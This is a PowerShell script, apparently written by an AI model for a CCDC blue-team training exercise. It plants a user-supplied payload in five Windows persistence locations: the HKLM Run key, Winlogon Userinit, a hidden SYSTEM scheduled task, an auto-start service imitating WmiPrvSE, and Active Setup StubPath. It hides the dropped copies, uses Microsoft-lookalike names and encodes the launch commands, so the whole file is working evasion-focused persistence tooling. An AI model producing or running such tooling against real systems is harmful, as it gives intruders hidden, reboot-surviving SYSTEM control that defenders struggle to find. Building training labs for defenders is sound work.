# =============================================================================
# CCDC Blue Team Training Script  -  Windows Multi-Location Persistence Planter
# =============================================================================
# Claude Sonnet 4.6 High
# "Now we need to go back to windows. I need a Windows powershell script to run
# that will do basically the same thing as that windows one. I will specify a 
# file to give and it will put it in 5 different locations to execute every boot.
# make this one in tricky spots."
# =============================================================================

# THIS SCRIPT PLANTS A PAYLOAD IN 5 DIFFERENT PERSISTENCE LOCATIONS ON THE DEVICE


#Requires -RunAsAdministrator

param(
    [string]$PayloadPath = ""
)

# -- Colour helpers ------------------------------------------------------------
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }

Write-Host ""
Write-Warn  "================================================================"
Write-Warn  " CCDC Blue Team Training  -  Windows Persistence Planter"
Write-Warn  "================================================================"
Write-Host ""

# -- Prompt for payload path if not supplied on the command line ---------------
while ([string]::IsNullOrWhiteSpace($PayloadPath)) {
    $PayloadPath = (Read-Host "  Path to payload script").Trim()
    if ([string]::IsNullOrWhiteSpace($PayloadPath)) {
        Write-Err "Path cannot be empty."
    }
}

# -- Validate payload ----------------------------------------------------------
if (-not (Test-Path $PayloadPath)) {
    Write-Err "Payload not found: $PayloadPath"
    Write-Err "Usage: .\CCDC_Windows_Persist_ClusterShells.ps1 -PayloadPath C:\path\to\payload.ps1"
    exit 1
}

$PayloadContent = Get-Content -Path $PayloadPath -Raw
Write-Info "Payload confirmed: $PayloadPath"
Write-Host ""

# -- Shared drop directory  -  hidden, looks like a Microsoft component ----------
# Using ProgramData because it is not visible to standard users and is
# commonly used by legitimate software. The subfolder name mimics a real
# Microsoft diagnostics path to blend in.
$DropDir = "C:\ProgramData\Microsoft\Windows\DiagTrack\Telemetry\cache"
if (-not (Test-Path $DropDir)) {
    New-Item -ItemType Directory -Path $DropDir -Force | Out-Null
}

# Hide the directory from casual Explorer browsing
$dirObj = Get-Item $DropDir -Force
$dirObj.Attributes = $dirObj.Attributes -bor [System.IO.FileAttributes]::Hidden

# -- Helper: encode a ps1 file to base64 for use in registry/task arguments ---
function Get-EncodedCommand {
    param([string]$ScriptPath)
    $bytes = [System.Text.Encoding]::Unicode.GetBytes((Get-Content $ScriptPath -Raw))
    return [Convert]::ToBase64String($bytes)
}

# =============================================================================
# LOCATION 1  -  HKLM Run Key 
# -----------------------------------------------------------------------------
# HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run values execute for ALL
# users at logon. Attackers favour this because it survives reboots, is not
# tied to a scheduled task, and many defenders only check the HKCU variant.
# Disguised as "WUDFComponentHost"  -  close to the real "WUDFHost" service name.
# =============================================================================

Write-Info "[1/5] Planting in HKLM Run registry key ..."

$Reg1PayloadName = "WUDFComponentHost"
$Reg1DropPath    = "$DropDir\wudf-host-svc.ps1"

Copy-Item -Path $PayloadPath -Destination $Reg1DropPath -Force
$f1 = Get-Item $Reg1DropPath -Force; $f1.Attributes = $f1.Attributes -bor [System.IO.FileAttributes]::Hidden

$Reg1Encoded = Get-EncodedCommand -ScriptPath $Reg1DropPath
$Reg1Command = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $Reg1Encoded"

$Reg1Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $Reg1Key -Name $Reg1PayloadName -Value $Reg1Command -Type String -Force

Write-Success "  Registry key : HKLM:\...\CurrentVersion\Run\$Reg1PayloadName"
Write-Success "  Payload copy : $Reg1DropPath (hidden)"
Write-Host ""

# =============================================================================
# LOCATION 2  -  Winlogon Userinit key 
# -----------------------------------------------------------------------------
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
# is a comma-separated list of programs launched by winlogon.exe after login.
# Appending a payload here is a classic technique  -  Userinit.exe is always
# present so a comma-appended extra binary looks like a formatting quirk.
# This runs as the logged-in user's context (SYSTEM on auto-logon machines).
# =============================================================================

Write-Info "[2/5] Planting in Winlogon Userinit registry key ..."

$Reg2PayloadName = "Userinit"
$Reg2DropPath    = "$DropDir\userinit-ext.ps1"
$Reg2Key         = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

Copy-Item -Path $PayloadPath -Destination $Reg2DropPath -Force
$f2 = Get-Item $Reg2DropPath -Force; $f2.Attributes = $f2.Attributes -bor [System.IO.FileAttributes]::Hidden

$Reg2Encoded = Get-EncodedCommand -ScriptPath $Reg2DropPath
$Reg2Addition = ",powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $Reg2Encoded"

# Preserve the existing Userinit value and append to it
$Reg2Current = (Get-ItemProperty -Path $Reg2Key -Name $Reg2PayloadName).$Reg2PayloadName
if ($Reg2Current -notmatch [regex]::Escape("userinit-ext")) {
    Set-ItemProperty -Path $Reg2Key -Name $Reg2PayloadName -Value ($Reg2Current.TrimEnd(',') + $Reg2Addition) -Force
}

Write-Success "  Registry key : HKLM:\...\CurrentVersion\Winlogon\Userinit (appended)"
Write-Success "  Payload copy : $Reg2DropPath (hidden)"
Write-Host ""

# =============================================================================
# LOCATION 3  -  Scheduled Task hidden in a Microsoft subfolder
# -----------------------------------------------------------------------------
# Task Scheduler allows tasks to be stored in arbitrary subfolders of the
# task library. Defenders using schtasks /query or Get-ScheduledTask without
# specifying -TaskPath often only see the root \ folder. Tasks buried under
# \Microsoft\Windows\<fake-subfolder> are visually indistinguishable from
# legitimate OS tasks in Task Scheduler GUI's left-hand tree.
# =============================================================================

Write-Info "[3/5] Planting hidden scheduled task in \Microsoft\Windows\ subfolder ..."

$Task3Name     = "DiagnosticsHub-StandardCollector"
$Task3Path     = "\Microsoft\Windows\DiagnosticsHub\"
$Task3DropPath = "$DropDir\diaghub-collector.ps1"

Copy-Item -Path $PayloadPath -Destination $Task3DropPath -Force
$f3 = Get-Item $Task3DropPath -Force; $f3.Attributes = $f3.Attributes -bor [System.IO.FileAttributes]::Hidden

$Task3Encoded = Get-EncodedCommand -ScriptPath $Task3DropPath
$Task3Action  = New-ScheduledTaskAction `
    -Execute  "powershell.exe" `
    -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $Task3Encoded"

$Task3Trigger  = New-ScheduledTaskTrigger -AtStartup
$Task3Settings = New-ScheduledTaskSettingsSet `
    -Hidden                             `
    -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
    -StartWhenAvailable                 `
    -RunOnlyIfNetworkAvailable:$false
$Task3Principal = New-ScheduledTaskPrincipal `
    -UserId    "SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel  Highest

# Create the subfolder in the task library if it doesn't exist
$TaskSvc = New-Object -ComObject Schedule.Service
$TaskSvc.Connect()
$TaskRoot = $TaskSvc.GetFolder("\Microsoft\Windows")
try { $TaskRoot.GetFolder("DiagnosticsHub") } catch {
    $TaskRoot.CreateFolder("DiagnosticsHub") | Out-Null
}

Unregister-ScheduledTask -TaskName $Task3Name -TaskPath $Task3Path -Confirm:$false -ErrorAction SilentlyContinue
Register-ScheduledTask `
    -TaskName   $Task3Name `
    -TaskPath   $Task3Path `
    -Action     $Task3Action `
    -Trigger    $Task3Trigger `
    -Settings   $Task3Settings `
    -Principal  $Task3Principal `
    -Description "Microsoft Diagnostics Hub standard data collector service" `
    -Force | Out-Null

Write-Success "  Scheduled task: $Task3Path$Task3Name  (hidden flag set)"
Write-Success "  Payload copy  : $Task3DropPath (hidden)"
Write-Host ""

# =============================================================================
# LOCATION 4  -  Windows Service (ImagePath registry hijack disguised as WMI)
# -----------------------------------------------------------------------------
# Creates a real Windows service pointing to a cmd.exe /c powershell launcher.
# Named "WmiPrvSE-Helper"  -  extremely close to the legitimate "WmiPrvSE.exe"
# (WMI Provider Host). The service is set to AUTO_START so it runs at boot
# as SYSTEM without any user interaction. Services are often overlooked when
# defenders focus on scheduled tasks and registry Run keys.
# =============================================================================

Write-Info "[4/5] Planting as a Windows service (WMI lookalike) ..."

$Svc4Name     = "WmiPrvSE-Helper"
$Svc4Display  = "WMI Provider Service Helper"
$Svc4Desc     = "Provides host process for Windows Management Instrumentation providers."
$Svc4DropPath = "$DropDir\wmiprvse-helper.ps1"

Copy-Item -Path $PayloadPath -Destination $Svc4DropPath -Force
$f4 = Get-Item $Svc4DropPath -Force; $f4.Attributes = $f4.Attributes -bor [System.IO.FileAttributes]::Hidden

# Point the service directly at powershell.exe -File <dropped script>.
# Using cmd.exe /c start /min would exit immediately (cmd exits after spawning),
# causing the SCM to see the service as stopped and restart it in a tight loop.
$psExe       = "$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$Svc4BinPath = "`"$psExe`" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Svc4DropPath`""

# Remove if already exists
$existingSvc = Get-Service -Name $Svc4Name -ErrorAction SilentlyContinue
if ($existingSvc) {
    Stop-Service -Name $Svc4Name -Force -ErrorAction SilentlyContinue
    sc.exe delete $Svc4Name | Out-Null
    Start-Sleep -Seconds 2
}

# sc.exe requires a space after each '=' and the binPath value must be quoted
# when it contains spaces. Backtick line-continuation prepends whitespace before
# each keyword which confuses sc.exe's parser  -  keep it on one line.
sc.exe create $Svc4Name binPath= "$Svc4BinPath" start= auto obj= LocalSystem | Out-Null

sc.exe description $Svc4Name "$Svc4Desc" | Out-Null
sc.exe failure      $Svc4Name reset= 60 actions= restart/5000/restart/5000/restart/5000 | Out-Null

# Blend the display name into the SCM list
Set-ItemProperty `
    -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$Svc4Name" `
    -Name "DisplayName" -Value $Svc4Display -Force

Write-Success "  Windows service: $Svc4Name  (AUTO_START, SYSTEM, failure-restart)"
Write-Success "  Payload copy   : $Svc4DropPath (hidden)"
Write-Host ""

# =============================================================================
# LOCATION 5  -  Active Setup registry key (per-user, runs ONCE per new logon)
# -----------------------------------------------------------------------------
# HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\ is processed
# by Windows Explorer at logon. Each subkey has a "StubPath" that runs if the
# version number in HKCU is lower than in HKLM  -  i.e. on first logon for any
# user, including new accounts. This is a rarely-audited autorun location that
# persists across user profile changes and is invisible to most autoruns
# checklists that focus on Run/RunOnce keys.
# =============================================================================

Write-Info "[5/5] Planting in Active Setup Installed Components (StubPath) ..."

# Use a GUID that resembles a real Microsoft component
$AS5GUID      = "{89820200-ECBD-11CF-8B85-00AA005B4383}"   # mimics IE Active Setup GUID format
$AS5KeyPath   = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\$AS5GUID"
$AS5DropPath  = "$DropDir\iecompat-stub.ps1"

Copy-Item -Path $PayloadPath -Destination $AS5DropPath -Force
$f5 = Get-Item $AS5DropPath -Force; $f5.Attributes = $f5.Attributes -bor [System.IO.FileAttributes]::Hidden

$AS5Encoded  = Get-EncodedCommand -ScriptPath $AS5DropPath
$AS5StubPath = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $AS5Encoded"

if (-not (Test-Path $AS5KeyPath)) {
    New-Item -Path $AS5KeyPath -Force | Out-Null
}
Set-ItemProperty -Path $AS5KeyPath -Name "(Default)"  -Value "Internet Explorer Core Fonts" -Force
Set-ItemProperty -Path $AS5KeyPath -Name "StubPath"   -Value $AS5StubPath                  -Force
Set-ItemProperty -Path $AS5KeyPath -Name "Version"    -Value "1,0,0,0"                     -Force
Set-ItemProperty -Path $AS5KeyPath -Name "Locale"     -Value "EN"                           -Force
Set-ItemProperty -Path $AS5KeyPath -Name "IsInstalled" -Value 1 -Type DWord                -Force

Write-Success "  Active Setup key: HKLM:\...\Active Setup\Installed Components\$AS5GUID"
Write-Success "  Payload copy    : $AS5DropPath (hidden)"
Write-Host ""

# =============================================================================
# Summary
# =============================================================================
Write-Warn  "================================================================"
Write-Warn  " TRAINING INJECTION COMPLETE"
Write-Warn  "================================================================"
Write-Host ""
Write-Host "  Payload planted in 5 startup persistence locations:" -ForegroundColor Yellow
Write-Host ""
Write-Host "  [1] HKLM Run Key          (fires at every user logon)"           -ForegroundColor Red
Write-Host "      HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Write-Host "      Value name: WUDFComponentHost"
Write-Host ""
Write-Host "  [2] Winlogon Userinit     (appended to winlogon launcher chain)" -ForegroundColor Red
Write-Host "      HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Write-Host "      Value name: Userinit (modified)"
Write-Host ""
Write-Host "  [3] Scheduled Task        (hidden in \Microsoft\Windows\ tree)"  -ForegroundColor Red
Write-Host "      \Microsoft\Windows\DiagnosticsHub\DiagnosticsHub-StandardCollector"
Write-Host ""
Write-Host "  [4] Windows Service       (AUTO_START, mimics WmiPrvSE)"         -ForegroundColor Red
Write-Host "      Service name: WmiPrvSE-Helper"
Write-Host ""
Write-Host "  [5] Active Setup StubPath (fires on any new user logon)"         -ForegroundColor Red
Write-Host "      HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11CF-8B85-00AA005B4383}"
Write-Host ""
Write-Host "  All payload copies hidden in:" -ForegroundColor Yellow
Write-Host "  $DropDir"
Write-Host ""
Write-Warn  "Run Cleanup-Persistence.ps1 to fully reset after the exercise."
Write-Warn  "Give trainees WIN_PERSISTENCE_GUIDE.txt to start the hunt."
Write-Host ""